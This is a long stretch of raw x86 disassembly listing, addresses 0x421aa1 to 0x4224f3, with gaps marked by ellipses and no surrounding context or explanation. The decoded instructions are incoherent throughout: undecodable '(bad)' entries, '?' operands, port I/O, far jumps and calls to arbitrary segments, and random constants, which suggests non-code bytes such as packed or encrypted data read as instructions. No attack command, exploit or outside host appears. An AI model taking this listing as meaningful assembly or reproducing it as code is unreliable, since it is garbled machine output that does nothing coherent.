  421aa1:	cmp    BYTE PTR [ebx-0x2d],0x53
  421aa5:	sub    esi,DWORD PTR [eax]
  421aa7:	ins    DWORD PTR es:[edi],dx
  421aa8:	scas   eax,DWORD PTR es:[edi]
  421aa9:	rcr    BYTE PTR [esi-0xdad45ef],0x52
  421ab0:	jae    0x421ac5
  421ab2:	mov    dh,0xd1
  421ab4:	dec    ebp
  421ab5:	loope  0x421ad4
  421ab7:	sti    
  421ab8:	mov    esp,0x7f692c4
  421abd:	daa    
  421abe:	xchg   esp,eax
  421abf:	push   edi
  421ac0:	mov    edx,0x461f1214
  421ac5:	(bad)  
  421ac6:	jmp    0x2127:0xd06a41b1
  421acd:	sub    BYTE PTR [edx],dh
  421acf:	sbb    dh,dh
  421ad1:	in     eax,0x8b
  421ad3:	xor    bh,BYTE PTR [edx]
  421ad5:	fisubr WORD PTR [esi-0xf]
  421ad8:	fsub   QWORD PTR [edx-0x18d53190]
  421ade:	test   eax,0xebba32ed
  421ae3:	or     eax,0x2f61219b
  421ae8:	shl    BYTE PTR [esi+edx*1+0x4485ea10],0xc1
  421af0:	or     eax,0xf17961d2
  421af5:	in     al,dx
  421af6:	dec    edi
  421af7:	pop    ds
  421af8:	cdq    
  421af9:	fisttp WORD PTR [edi-0x2a]
  421afc:	outs   dx,DWORD PTR ds:[esi]
  421afd:	push   ds
  421afe:	mov    bl,0x4
  421b00:	ret    
  421b01:	scas   eax,DWORD PTR es:[edi]
  421b02:	or     eax,ebx
  421b04:	in     al,dx
  421b05:	inc    ebp
  421b06:	cwde   
  421b07:	jp     0x421b43
  421b09:	sub    esp,DWORD PTR [edx]
  421b0b:	test   eax,0x806f1374
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,BYTE PTR [eax]
  421b81:	or     DWORD PTR [edi],esp
  421b83:	fild   QWORD PTR [eax]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	pop    ss
  421b8d:	stos   DWORD PTR es:[edi],eax
  421b8e:	pop    edi
  421b8f:	loop   0x421b42
  421b91:	outs   dx,DWORD PTR ds:[esi]
  421b92:	and    bh,ch
  421b94:	pop    esi
  421b95:	fsubr  st,st(4)
  421b97:	jns    0x421c12
  421b99:	retf   0x5da1
  421b9c:	mov    ecx,0xc3c6972f
  421ba1:	addr16 adc eax,0x7039863a
  421ba7:	pop    edi
  421ba8:	pop    ebx
  421ba9:	pop    ebp
  421baa:	mov    ah,0x9d
  421bac:	hlt    
  421bad:	scas   al,BYTE PTR es:[edi]
  421bae:	out    0x36,eax
  421bb0:	lahf   
  421bb1:	loop   0x421b78
  421bb3:	push   ds
  421bb4:	ins    DWORD PTR es:[edi],dx
  421bb5:	test   bh,cl
  421bb7:	fidivr WORD PTR [ebx]
  421bb9:	xor    eax,0xb531465d
  421bbe:	sub    DWORD PTR [ebp+0x13053b3],ebx
  421bc4:	sti    
  421bc5:	into   
  421bc6:	push   es
  421bc7:	push   ebp
  421bc8:	into   
  421bc9:	sub    eax,0x1c975838
  421bce:	jp     0x421b79
  421bd0:	mov    bh,0x4c
  421bd2:	in     al,dx
  421bd3:	add    ax,0xd47e
  421bd7:	push   ebx
  421bd8:	jl     0x421c42
  421bda:	into   
  421bdb:	jbe    0x421c29
  421bdd:	pusha  
  421bde:	cmp    BYTE PTR [edx+ebx*8],bh
  421be1:	int    0x10
  421be3:	pop    esp
  421be4:	outs   dx,DWORD PTR ds:[esi]
  421be5:	add    eax,0x6941c99f
  421bea:	mov    bl,0x40
  421bec:	shl    DWORD PTR [esi-0x2e3e4cee],0xa
  421bf3:	push   es
  421bf4:	adc    edi,edx
  421bf6:	pop    es
  421bf7:	daa    
  421bf8:	es addr16 xchg ebx,esi
  421bfc:	cs aam 0x6e
  421bff:	fnstcw WORD PTR [eax+0x31]
  421c02:	push   esi
  421c03:	dec    ebp
  421c04:	pop    es
  421c05:	call   0x2a0aff64
  421c0a:	aam    0x44
  421c0c:	xchg   ebx,eax
  421c0d:	pop    es
  421c0e:	js     0x421c1a
  421c10:	mov    eax,0x6c50519d
  421c15:	aad    0xa9
  421c17:	bound  edx,QWORD PTR [ecx+0x1e7380b7]
  421c1d:	call   0x3d066831
  421c22:	es nop
  421c24:	int3   
  421c25:	mov    cl,BYTE PTR [eax+eiz*4]
  421c28:	sbb    edx,DWORD PTR [edx]
  421c2a:	lahf   
  421c2b:	mov    bl,0x3d
  421c2d:	or     al,0xca
  421c2f:	and    al,0xe7
  421c31:	push   ss
  421c32:	rcr    BYTE PTR [esi+0x71cd8688],1
  421c38:	mov    ds:0x8679e0c7,al
  421c3d:	sub    al,0x76
  421c3f:	mov    eax,0x222c8711
  421c44:	cs add eax,0x7191dad8
  421c4a:	jns    0x421beb
  421c4c:	xor    DWORD PTR [edx],0x42
  421c4f:	fcom   DWORD PTR [eax+0x42]
  421c52:	sub    esi,DWORD PTR [ebx]
  421c54:	jecxz  0x421ca0
  421c56:	aam    0x55
  421c58:	iret   
  421c59:	shr    DWORD PTR [ebx-0x6b],cl
  421c5c:	xor    esi,eax
  421c5e:	mov    eax,ds:0x3cbfa884
  421c63:	sub    al,0x3a
  421c65:	mov    esp,0x73c6c8b4
  421c6a:	and    BYTE PTR [ecx],ah
  421c6c:	les    esp,FWORD PTR [ecx-0x6f168c9f]
  421c72:	push   ebp
  421c73:	sub    ah,ch
  421c75:	pop    ecx
  421c76:	and    bh,BYTE PTR ds:0xf1184a85
  421c7c:	adc    al,0xca
  421c7e:	out    0x10,eax
  421c80:	jmp    0x2e0d:0xc50fc47d
  421c87:	les    ebp,FWORD PTR [edx]
  421c89:	fucom  st(0)
  421c8b:	mov    fs:0x99058f,al
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	popf   
  421d01:	push   edx
  421d02:	aam    0x4c
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	popf   
  421d0d:	pop    ds
  421d0e:	push   ebx
  421d0f:	push   esi
  421d10:	sub    dl,BYTE PTR [edi-0x55d9a542]
  421d16:	mov    al,0xc6
  421d18:	inc    eax
  421d19:	(bad)  [eax-0x5c]
  421d1c:	mov    edi,0x81caad10
  421d21:	dec    esp
  421d22:	arpl   WORD PTR [eax+0x2f],ax
  421d25:	mov    al,ds:0x6ee61adc
  421d2a:	imul   esp,edi,0xffffff8c
  421d2d:	push   edx
  421d2e:	and    ah,BYTE PTR [ecx+0x54]
  421d31:	stos   DWORD PTR es:[edi],eax
  421d32:	cmp    edx,DWORD PTR ds:0x37542da8
  421d38:	add    cl,dh
  421d3a:	mov    esp,0xb8c32081
  421d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d40:	sub    al,0x6a
  421d42:	arpl   WORD PTR [esp+edx*4-0x67f2d0b8],ax
  421d49:	call   FWORD PTR [edi+0x7a]
  421d4c:	(bad)  [eax+edi*2-0x1de0d26e]
  421d53:	push   ds
  421d54:	ja     0x421d49
  421d56:	outs   dx,BYTE PTR ds:[esi]
  421d57:	sub    DWORD PTR [eax+0x1f],ecx
  421d5a:	or     eax,0xb6058f3d
  421d5f:	mov    edi,0xdc4e8c15
  421d64:	mov    bl,0xef
  421d66:	mov    edi,0x128dc535
  421d6b:	rcl    DWORD PTR [ecx],cl
  421d6d:	jns    0x421d14
  421d6f:	fmul   DWORD PTR gs:[edi-0x3a]
  421d73:	outs   dx,BYTE PTR ds:[esi]
  421d74:	jmp    ebx
  421d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d77:	pusha  
  421d78:	arpl   WORD PTR [ebp+0x52],di
  421d7b:	jp     0x421d14
  421d7d:	(bad)  
  421d7e:	mov    ebx,ebx
  421d80:	push   edi
  421d81:	repz aas 
  421d83:	out    dx,al
  421d84:	out    0x7d,eax
  421d86:	sti    
  421d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d88:	push   ebx
  421d89:	ds ds mov ecx,ebp
  421d8d:	sbb    al,0x93
  421d8f:	jle    0x421dca
  421d91:	daa    
  421d92:	rol    DWORD PTR [ecx-0x23518654],cl
  421d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d99:	jmp    0x421ded
  421d9b:	inc    esp
  421d9c:	iret   
  421d9d:	mov    WORD PTR [ebx+0x76],gs
  421da0:	pop    esi
  421da1:	push   eax
  421da2:	or     DWORD PTR [ebx+0x46],ebp
  421da5:	std    
  421da6:	jnp    0x421dc2
  421da8:	addr16 test al,0x9a
  421dab:	shr    BYTE PTR [esi+0x22a9b596],cl
  421db1:	or     dl,BYTE PTR [eax+0xe]
  421db4:	out    0x8,eax
  421db6:	in     al,dx
  421db7:	sub    esi,ecx
  421db9:	iret   
  421dba:	sti    
  421dbb:	iret   
  421dbc:	mov    ebx,0xbc1f81a4
  421dc1:	ja     0x421d68
  421dc3:	fs in  al,dx
  421dc5:	(bad)  
  421dc7:	add    BYTE PTR [edi+0x5d5ecb29],dh
  421dcd:	sub    al,0x3e
  421dcf:	bound  ecx,QWORD PTR [ecx+eiz*8+0x6b26b958]
  421dd6:	mov    esp,0x227dc352
  421ddb:	xchg   edi,eax
  421ddc:	clc    
  421ddd:	or     eax,0x244e029a
  421de2:	dec    esp
  421de3:	xchg   bx,ax
  421de5:	mov    eax,0xa4da2da1
  421dea:	push   esp
  421deb:	into   
  421dec:	mov    ch,0xa9
  421dee:	inc    esi
  421def:	inc    ebx
  421df0:	mov    ch,dl
  421df2:	inc    esp
  421df3:	popa   
  421df4:	jno    0x421dd8
  421df6:	pop    eax
  421df7:	arpl   WORD PTR [ecx-0x53dbe0f9],sp
  421dfd:	mov    al,ds:0x7e7f10fc
  421e02:	aas    
  421e03:	sbb    DWORD PTR [ebx-0x4ae2e714],eax
  421e09:	sti    
  421e0a:	mov    esi,gs
  421e0c:	je     0x421dc0
  421e0e:	inc    esp
  421e0f:	adc    eax,DWORD PTR [eax]
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	fwait
  421e81:	in     al,dx
  421e82:	mov    esp,ebx
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	ss sti 
  421e8e:	inc    ebx
  421e8f:	jnp    0x421e2c
  421e91:	imul   esi,DWORD PTR [ebx-0x1c],0x3da1af36
  421e98:	idiv   DWORD PTR [esi+esi*8-0x54dc93c8]
  421e9f:	enter  0xa7f2,0x7a
  421ea3:	pop    ebx
  421ea4:	mov    ds:0x7ab23072,al
  421ea9:	imul   edx,DWORD PTR [ebp-0x38],0xe0a8c976
  421eb0:	mul    DWORD PTR [ecx]
  421eb2:	push   ss
  421eb3:	nop
  421eb4:	in     al,0xb9
  421eb6:	jp     0x421ecb
  421eb8:	xor    DWORD PTR [ebx-0x8383f3],eax
  421ebe:	shr    ebx,1
  421ec0:	mov    BYTE PTR [ebx+0x3a121b97],al
  421ec6:	retf   
  421ec7:	rcl    DWORD PTR ds:0xa7aa6e02,1
  421ecd:	inc    eax
  421ece:	xchg   ebx,eax
  421ecf:	repz push edi
  421ed2:	xor    eax,DWORD PTR [eax-0x7172abc3]
  421ed8:	jmp    0xea1964be
  421edd:	call   0xdc0d:0xa9739431
  421ee4:	jne    0x421eef
  421ee6:	test   DWORD PTR [edi+0x1a0930a0],esi
  421eec:	mov    ebp,0xc2f3fe07
  421ef1:	push   ss
  421ef2:	xlat   BYTE PTR ds:[ebx]
  421ef3:	jno    0x421f3a
  421ef5:	scas   al,BYTE PTR es:[edi]
  421ef6:	xchg   ecx,eax
  421ef7:	adc    DWORD PTR [ebx-0x3b6ae9f7],ebx
  421efd:	mov    esi,0x68e93f37
  421f02:	rol    BYTE PTR [edi-0x19215847],cl
  421f08:	int    0xc5
  421f0a:	fwait
  421f0b:	dec    esp
  421f0c:	cmp    eax,0xda100931
  421f11:	sbb    BYTE PTR [eax],ch
  421f13:	scas   al,BYTE PTR es:[edi]
  421f14:	shl    DWORD PTR [eax-0x34],cl
  421f17:	push   esi
  421f18:	fldenv [eax+0x7]
  421f1b:	jmp    0x421ea7
  421f1d:	mov    dh,0x1
  421f1f:	mov    eax,0x88f0720e
  421f24:	sti    
  421f25:	scas   al,BYTE PTR es:[edi]
  421f26:	ja     0x421fa5
  421f28:	fcmovbe st,st(6)
  421f2a:	jmp    0xe541:0x31a0177f
  421f31:	aaa    
  421f32:	daa    
  421f33:	imul   DWORD PTR [ecx-0x67]
  421f36:	bound  eax,QWORD PTR [ebx-0x792bb9e]
  421f3c:	out    0x82,al
  421f3e:	mov    bl,0xbc
  421f40:	push   eax
  421f41:	xchg   BYTE PTR [edx-0x5],ah
  421f44:	lock add DWORD PTR [ecx-0x4],ebp
  421f48:	mov    eax,0x9ace2fa0
  421f4d:	sbb    eax,0x12886b57
  421f52:	mov    al,0x31
  421f54:	jbe    0x421f65
  421f56:	xchg   ecx,eax
  421f57:	add    BYTE PTR cs:[ecx-0x7013a801],0xd
  421f5f:	xchg   ecx,eax
  421f60:	inc    edx
  421f61:	push   ebp
  421f62:	fimul  DWORD PTR [ebp-0x4c]
  421f65:	lods   al,BYTE PTR ds:[esi]
  421f66:	or     eax,0x6b6ab080
  421f6b:	neg    DWORD PTR [edx+0x33]
  421f6e:	(bad)  
  421f6f:	mov    ecx,0x3eb82e54
  421f74:	add    edx,DWORD PTR [esi]
  421f76:	les    edi,FWORD PTR [esi+edi*4+0x66]
  421f7a:	iret   
  421f7b:	mov    bl,0x8a
  421f7d:	and    ch,BYTE PTR [edx]
  421f7f:	jne    0x421f31
  421f81:	adc    DWORD PTR [edx],esi
  421f83:	mov    edx,DWORD PTR [edx-0x3b]
  421f86:	iret   
  421f87:	push   cs
  421f88:	push   es
  421f89:	push   0xffffff8e
  421f8b:	fiadd  WORD PTR [edi+0x48]
  421f8e:	xor    eax,0xcb
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 add al,0xb1
  422002:	sub    eax,0x16a34d4
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	adc    eax,0x5655a912
  422011:	cmp    al,0x12
  422013:	fbld   TBYTE PTR [edx+ebp*8+0x12]
  422017:	aam    0xd1
  422019:	dec    ecx
  42201a:	inc    ebx
  42201b:	fcmovnu st,st(6)
  42201d:	jbe    0x421fe9
  42201f:	(bad)  
  422020:	mov    al,0x35
  422022:	ret    
  422023:	mov    esi,?
  422025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422026:	jae    0x421fea
  422028:	call   0x733bcf9d
  42202d:	or     bl,al
  42202f:	leave  
  422030:	fsubr  QWORD PTR [eax+0x33]
  422033:	mov    cl,0x7c
  422035:	cli    
  422036:	retf   0x43f8
  422039:	pop    ds
  42203a:	call   0x8d3a9b74
  42203f:	lods   eax,DWORD PTR ds:[esi]
  422040:	out    dx,eax
  422041:	es setb al
  422045:	iretw  
  422047:	arpl   WORD PTR [eax+0xb],cx
  42204a:	mov    esi,0x8d9ec6ad
  42204f:	mov    bh,0xfe
  422051:	aad    0x4f
  422053:	fld    TBYTE PTR [esi+0x464c2a4c]
  422059:	pushf  
  42205a:	sbb    BYTE PTR [edi],bh
  42205c:	(bad)  
  42205d:	mov    ebx,0xcb19fa3d
  422062:	adc    dl,BYTE PTR [edx]
  422064:	outs   dx,DWORD PTR ds:[esi]
  422065:	dec    edx
  422066:	inc    edx
  422067:	cmp    ebp,DWORD PTR [esi+0x63ba5a54]
  42206d:	pop    esi
  42206e:	ins    BYTE PTR es:[edi],dx
  42206f:	adc    BYTE PTR [esi+0x25],al
  422072:	shr    BYTE PTR [eax+0x33],cl
  422075:	leave  
  422076:	das    
  422077:	sbb    al,dh
  422079:	mov    dl,0x7c
  42207b:	rcl    DWORD PTR [eax+0x7aa6da58],1
  422081:	adc    BYTE PTR [edi],0x8c
  422084:	xor    dl,BYTE PTR [ecx+0x5d]
  422087:	cmp    eax,0x6c9a3c0e
  42208c:	test   eax,0x47a8caee
  422091:	and    ebp,0xfffffff9
  422094:	out    0x23,eax
  422096:	(bad)  
  422097:	push   ds
  422098:	or     ah,ch
  42209a:	dec    ebp
  42209b:	jne    0x4220f4
  42209d:	clc    
  42209e:	mov    ds:0xda841f03,al
  4220a3:	rcl    DWORD PTR [ebp+0x34],0xc7
  4220a7:	stos   BYTE PTR es:[edi],al
  4220a8:	or     ch,BYTE PTR [eax+0x2c]
  4220ab:	push   ebx
  4220ac:	push   edx
  4220ad:	jnp    0x4220b6
  4220af:	(bad)  
  4220b0:	fcmovnu st,st(5)
  4220b2:	adc    ebp,DWORD PTR [esi+0x25]
  4220b5:	jmp    0x42212c
  4220b7:	adc    dl,ch
  4220b9:	inc    edx
  4220ba:	popf   
  4220bb:	es jg  0x4220a3
  4220be:	cmp    edi,DWORD PTR [ebp+0x11]
  4220c1:	test   ebp,eax
  4220c3:	rcr    DWORD PTR [eax-0x70],0xc5
  4220c7:	loopne 0x4220ad
  4220c9:	push   edi
  4220ca:	fnsave [ecx-0x14]
  4220cd:	shr    BYTE PTR [ecx+esi*1],1
  4220d0:	xchg   ecx,eax
  4220d1:	out    dx,al
  4220d2:	mov    ebp,0xe688ea16
  4220d7:	pop    ebp
  4220d8:	leave  
  4220d9:	or     al,0x1e
  4220db:	les    ebx,FWORD PTR ds:0x8a24f5e1
  4220e1:	mov    eax,eax
  4220e3:	push   edx
  4220e4:	loope  0x422098
  4220e6:	xchg   DWORD PTR [esi+ebx*8],ebp
  4220e9:	jle    0x422167
  4220eb:	add    BYTE PTR [eax],0x26
  4220ee:	jmp    0xa5ef:0xcb633660
  4220f5:	jge    0x4220c9
  4220f7:	js     0x422081
  4220f9:	cmp    al,BYTE PTR ds:0x1ea4597
  4220ff:	mov    ds:0x4fa57a7c,al
  422104:	mov    ds:0x5cdc14ea,al
  422109:	shl    DWORD PTR [ecx],0xbb
  42210c:	mov    WORD PTR [ebx+0x47b4],?
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    edi,DWORD PTR [esi-0x6f]
  422182:	loope  0x42217a
  422184:	cmp    BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	repz jp 0x422158
  42218f:	call   DWORD PTR [esi+edi*2]
  422192:	jecxz  0x4221c2
  422194:	pop    eax
  422195:	xchg   BYTE PTR ds:0x317d51f,ch
  42219b:	lds    ecx,FWORD PTR [edi]
  42219d:	dec    esp
  42219e:	ret    
  42219f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221a0:	shl    DWORD PTR [ecx],0xcb
  4221a3:	xlat   BYTE PTR ds:[ebx]
  4221a4:	dec    edx
  4221a5:	sub    esp,eax
  4221a7:	shl    DWORD PTR [esi+esi*8],1
  4221aa:	mov    bh,0x73
  4221ac:	or     eax,esp
  4221ae:	mov    WORD PTR [edi],cs
  4221b0:	cmp    edx,edx
  4221b2:	sti    
  4221b3:	sbb    DWORD PTR [edx+0x537cfb19],edi
  4221b9:	inc    eax
  4221ba:	mov    esi,0xf6ce8b94
  4221bf:	adc    al,0x49
  4221c1:	imul   edi,DWORD PTR [edx],0x38db6282
  4221c7:	call   0xee1a:0x51ba9318
  4221ce:	push   ds
  4221cf:	pop    eax
  4221d0:	add    dh,dl
  4221d2:	into   
  4221d3:	je     0x4221dc
  4221d5:	scas   al,BYTE PTR es:[edi]
  4221d6:	mov    ?,eax
  4221d8:	pop    ebp
  4221d9:	or     al,0x74
  4221db:	and    DWORD PTR [ebx-0x28],ebx
  4221de:	and    bh,BYTE PTR [esi+0xd]
  4221e1:	adc    BYTE PTR [edx+0x5fac94bd],0x15
  4221e8:	ret    
  4221e9:	paddsb mm1,QWORD PTR ds:0x7c8bb044
  4221f0:	push   ebx
  4221f1:	or     esi,DWORD PTR [eax+0x5c1cc63e]
  4221f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221f8:	ret    0x3ea
  4221fb:	mov    es,WORD PTR [esi-0x7a37dae]
  422201:	fadd   st(3),st
  422203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422204:	and    BYTE PTR [esi],ah
  422206:	ja     0x4221cf
  422208:	xchg   edi,eax
  422209:	sbb    bh,bl
  42220b:	sub    cl,BYTE PTR ss:[eax]
  42220e:	lods   al,BYTE PTR ds:[esi]
  42220f:	pushf  
  422210:	into   
  422211:	mov    ah,0x79
  422213:	pop    edx
  422214:	push   esp
  422215:	js     0x4221b1
  422217:	fs leave 
  422219:	dec    esp
  42221a:	mov    bl,0x1d
  42221c:	lods   al,BYTE PTR ds:[esi]
  42221d:	aam    0x1
  42221f:	push   edi
  422220:	and    ebx,DWORD PTR [edi-0x598c9789]
  422226:	mov    esp,0xe651f603
  42222b:	push   eax
  42222c:	jecxz  0x42228b
  42222e:	std    
  42222f:	in     al,0x60
  422231:	and    ebp,DWORD PTR [eax+0x3ccb10d5]
  422237:	nop
  422238:	pop    esp
  422239:	retf   0x3a03
  42223c:	mov    WORD PTR [edi],fs
  42223e:	std    
  42223f:	add    eax,0x8d73fcdc
  422244:	sbb    dl,0x57
  422247:	mov    ds:0x35272721,eax
  42224c:	add    dh,dl
  42224e:	inc    edx
  42224f:	aad    0x50
  422251:	popa   
  422252:	and    dh,BYTE PTR [eax-0x8d13f86]
  422258:	loop   0x422224
  42225a:	loopne 0x4221eb
  42225c:	ins    BYTE PTR es:[edi],dx
  42225d:	dec    ebp
  42225e:	dec    esi
  42225f:	sbb    DWORD PTR [edi],0xffffff90
  422262:	call   0xb6189a
  422267:	sbb    bl,BYTE PTR [eax-0x70dae892]
  42226d:	and    BYTE PTR [ecx-0x70],dl
  422270:	push   es
  422271:	jo     0x4222a5
  422273:	adc    BYTE PTR [esi],0xaf
  422276:	ins    BYTE PTR es:[edi],dx
  422277:	into   
  422278:	fistp  DWORD PTR [edi]
  42227a:	mov    eax,0x8098a343
  42227f:	mov    ebx,0x47e38498
  422284:	leave  
  422285:	fwait
  422286:	add    al,0xa1
  422288:	add    ch,bl
  42228a:	inc    eax
  42228b:	inc    ebx
  42228c:	sub    DWORD PTR [ebx],ecx
  42228e:	cmp    DWORD PTR [eax+eax*1],0x0
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	in     al,dx
  422301:	inc    esp
  422302:	popf   
  422303:	jl     0x422341
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	repz rol DWORD PTR [eax+0x59b19c41],cl
  422313:	vpunpckhwd ymm7,ymm2,YMMWORD PTR [ecx-0x458cda74]
  42231b:	aas    
  42231c:	shl    DWORD PTR [bp+0x25f3],1
  422321:	mov    esi,0xf26cf3c2
  422326:	push   0xfffffffb
  422328:	aam    0x37
  42232a:	mov    bl,0x6d
  42232c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232d:	pop    esi
  42232e:	jp     0x4222e8
  422330:	sub    eax,0xfca7dd2d
  422335:	enter  0x55b8,0x3a
  422339:	jae    0x422347
  42233b:	(bad)  
  42233c:	je     0x422313
  42233e:	cmp    cl,BYTE PTR [edx-0x6d364bf3]
  422344:	dec    eax
  422345:	call   0xad80c128
  42234a:	xor    esp,DWORD PTR [ecx]
  42234c:	dec    ebp
  42234d:	neg    BYTE PTR [eax+0x1a3ea882]
  422353:	xchg   edi,eax
  422354:	pusha  
  422355:	shl    DWORD PTR [ecx+0x6674ce77],0x91
  42235c:	(bad)  
  42235d:	pop    ebx
  42235e:	les    esi,FWORD PTR [eax+ebp*4]
  422361:	push   edi
  422362:	test   BYTE PTR [edi-0x2c],ah
  422365:	mov    esi,DWORD PTR [ecx]
  422367:	push   0x6a
  422369:	daa    
  42236a:	ret    0x2a39
  42236d:	sahf   
  42236e:	imul   ebp
  422370:	xor    al,BYTE PTR ds:0x684e4393
  422376:	call   FWORD PTR [ecx-0x51]
  422379:	cmp    cl,BYTE PTR [edi]
  42237b:	fbld   TBYTE PTR [edi-0x55c2d5e1]
  422381:	inc    edx
  422382:	cmp    al,0x6b
  422384:	cli    
  422385:	mov    ah,dl
  422387:	jnp    0x42233d
  422389:	js     0x42231b
  42238b:	mov    esi,0x74d9cb2
  422390:	lods   al,BYTE PTR ds:[esi]
  422391:	dec    eax
  422392:	push   es
  422393:	pusha  
  422394:	cdq    
  422395:	sub    eax,0xed5868e
  42239a:	lahf   
  42239b:	jl     0x422338
  42239d:	daa    
  42239e:	ret    0xa013
  4223a1:	pusha  
  4223a2:	add    DWORD PTR [esi-0x35],ecx
  4223a5:	sbb    eax,0xbe222cb5
  4223aa:	aad    0x3c
  4223ac:	adc    edx,DWORD PTR [ecx]
  4223ae:	mov    edx,0x4893d6fd
  4223b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b4:	add    dh,bh
  4223b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b7:	repz lea ebx,[edi+0xb]
  4223bb:	cli    
  4223bc:	jnp    0x4223ae
  4223be:	repz mov bl,0x5c
  4223c1:	sub    ecx,ecx
  4223c3:	mov    esi,0x92783bcf
  4223c8:	ja     0x4223e9
  4223ca:	mov    edi,0xec9e9714
  4223cf:	repz jg 0x42237d
  4223d2:	or     BYTE PTR [ecx+0x19],ah
  4223d5:	jae    0x4223ca
  4223d7:	fiadd  DWORD PTR [edx+edi*1-0x3946a0b6]
  4223de:	inc    esp
  4223df:	mov    edi,esi
  4223e1:	xchg   BYTE PTR [edi+0x3c],bl
  4223e4:	cmc    
  4223e5:	fcmove st,st(1)
  4223e7:	sub    BYTE PTR [esi+0x2d],bh
  4223ea:	loope  0x4223c2
  4223ec:	xor    al,0xe4
  4223ee:	outs   dx,BYTE PTR ds:[esi]
  4223ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223f0:	data16 test BYTE PTR [edi+0x37ad1465],dh
  4223f7:	in     al,dx
  4223f8:	jg     0x422473
  4223fa:	mov    BYTE PTR [ecx+eax*4+0x3a94bc01],cl
  422401:	dec    ebp
  422402:	and    eax,0x61470a7f
  422407:	out    dx,eax
  422408:	pop    edx
  422409:	push   0x2061f0f8
  42240e:	into   
  42240f:	int3   
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	xchg   esp,eax
  422481:	sar    DWORD PTR [esi],1
  422483:	pop    ebp
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	xlat   BYTE PTR ds:[ebx]
  42248d:	cli    
  42248e:	pop    esi
  42248f:	scas   eax,DWORD PTR es:[edi]
  422490:	mov    al,ds:0x896f0c11
  422495:	lds    edx,FWORD PTR [ebp-0x66fb8eaf]
  42249b:	mov    dh,0x6
  42249d:	mov    ch,0x18
  42249f:	je     0x4224fb
  4224a1:	inc    eax
  4224a2:	dec    edi
  4224a3:	inc    ebp
  4224a4:	push   eax
  4224a5:	add    BYTE PTR [esi+eiz*1+0x2e],0x9c
  4224aa:	and    DWORD PTR [ebp+0x58],edx
  4224ad:	fidiv  DWORD PTR [edx+eiz*2-0x50]
  4224b1:	sub    edx,ebx
  4224b3:	or     al,0x5e
  4224b5:	mov    ecx,0xf99333da
  4224ba:	adc    DWORD PTR [eax-0x469da018],eax
  4224c0:	adc    al,0xf3
  4224c2:	push   0x19f3848f
  4224c7:	sti    
  4224c8:	mov    bp,0x17c9
  4224cc:	js     0x4224be
  4224ce:	call   0xbae75384
  4224d3:	fisttp DWORD PTR [ecx]
  4224d5:	inc    ecx
  4224d6:	mov    ecx,0x2cccc8b8
  4224db:	xchg   ecx,eax
  4224dc:	xor    ch,dl
  4224de:	cs jge 0x42254a
  4224e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e2:	add    edx,edi
  4224e4:	mov    edx,0xa1ae60f8
  4224e9:	pop    edx
  4224ea:	mov    DWORD PTR [ecx+ebx*4],0x231332dc
  4224f1:	mov    dh,0x5b
  4224f3:	int3   
